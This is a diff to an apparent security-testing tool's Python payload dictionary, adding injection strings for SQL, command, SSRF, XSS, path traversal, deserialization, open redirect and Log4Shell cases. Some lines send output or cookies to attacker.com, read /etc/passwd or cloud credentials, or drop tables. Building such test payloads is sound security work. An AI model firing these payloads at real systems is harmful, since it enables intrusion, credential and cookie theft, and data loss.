@@ -30,12 +30,12 @@ logger = logging.getLogger(__name__)
 # ---------------------------------------------------------------------------
 
 _PAYLOAD_STRATEGIES: dict[str, list[str]] = {
+    # ── 表达式注入 ───────────────────────────────────────────────────────
     "spring el": [
         "T(java.lang.Runtime).getRuntime().exec('id')",
         "T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})",
         "T(java.lang.ProcessBuilder).new(new String[]{'/bin/sh','-c','id'}).start()",
         "T(java.lang.System).getenv()",
-        "T(java.lang.System).exit(0)",
     ],
     "ognl": [
         "@java.lang.Runtime@getRuntime().exec('id')",
@@ -54,6 +54,107 @@ _PAYLOAD_STRATEGIES: dict[str, list[str]] = {
     "mako": [
         "${__import__('os').popen('id').read()}",
         "<%\nimport os\n%>\n${os.popen('id').read()}",
+    ],
+
+    # ── SQL 注入 ─────────────────────────────────────────────────────────
+    "sql injection": [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "'; DROP TABLE users--",
+        "' UNION SELECT null,username,password FROM users--",
+        "1' AND SLEEP(5)--",
+        "1; EXEC xp_cmdshell('whoami')--",
+    ],
+    "sqli": [
+        "' OR '1'='1",
+        "' UNION SELECT null,null,null--",
+        "1 AND 1=2 UNION SELECT table_name,null FROM information_schema.tables--",
+    ],
+
+    # ── 命令注入 ─────────────────────────────────────────────────────────
+    "command injection": [
+        "; id",
+        "| id",
+        "& id",
+        "`id`",
+        "$(id)",
+        "; cat /etc/passwd",
+        "| curl http://attacker.com/$(id)",
+        "\n id",
+    ],
+    "rce": [
+        "; id",
+        "| whoami",
+        "& whoami",
+        "$(whoami)",
+    ],
+
+    # ── 路径穿越 ─────────────────────────────────────────────────────────
+    "path traversal": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "....//....//....//etc/passwd",
+        "/etc/passwd%00",
+    ],
+    "directory traversal": [
+        "../../../etc/passwd",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "..\\..\\..\\etc\\passwd",
+    ],
+
+    # ── SSRF ─────────────────────────────────────────────────────────────
+    "ssrf": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:22",
+        "http://localhost:8080/admin",
+        "http://[::1]/admin",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_PING%0D%0A",
+        "dict://127.0.0.1:11211/stat",
+    ],
+    "server-side request forgery": [
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://192.168.1.1",
+        "http://internal-service.local/api/secret",
+    ],
+
+    # ── XSS ──────────────────────────────────────────────────────────────
+    "xss": [
+        "<script>alert(document.cookie)</script>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(document.domain)",
+        "'><script>fetch('https://attacker.com/?c='+document.cookie)</script>",
+        "<svg/onload=alert(1)>",
+    ],
+    "cross-site scripting": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(document.domain)>",
+    ],
+
+    # ── 反序列化 ──────────────────────────────────────────────────────────
+    "insecure deserialization": [
+        "rO0AB...（Java序列化gadget chain，需配合ysoserial工具生成）",
+        "__reduce__利用（Python pickle）: class Exploit: def __reduce__(self): return os.system, ('id',)",
+    ],
+    "deserialization": [
+        "（Java）使用 ysoserial 生成 CommonsCollections 利用链",
+        "（Python）import pickle; pickle.loads(<crafted_bytes>)",
+    ],
+
+    # ── 不安全重定向 ─────────────────────────────────────────────────────
+    "open redirect": [
+        "https://attacker.com",
+        "//attacker.com",
+        "/\\attacker.com",
+        "http://attacker.com%2F@legitimate.com",
+    ],
+
+    # ── 日志注入 ──────────────────────────────────────────────────────────
+    "log injection": [
+        "\r\n[FATAL] Admin password: pwned",
+        "%0d%0a[ERROR] Fake log entry",
+        "${jndi:ldap://attacker.com/exploit}",  # Log4Shell
     ],
 }
 
